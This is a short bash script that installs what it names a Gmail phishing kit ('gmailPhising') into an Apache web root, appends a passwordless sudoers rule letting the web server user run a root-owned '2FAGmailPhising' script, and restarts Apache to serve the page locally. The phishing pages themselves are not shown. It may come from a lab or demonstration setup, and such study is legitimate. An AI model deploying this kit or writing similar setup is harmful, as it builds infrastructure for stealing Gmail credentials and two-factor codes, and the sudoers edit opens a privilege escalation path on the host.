#!/bin/bash
cp -r gmailPhising /var/www/html
chown -R www-data:www-data /var/www
echo -n "www-data ALL=(user) NOPASSWD: /root/2FAGmailPhising/root.sh" >> /etc/sudoers
service apache2 restart
echo "The service is running in http://127.0.0.1/gmailPhising/"
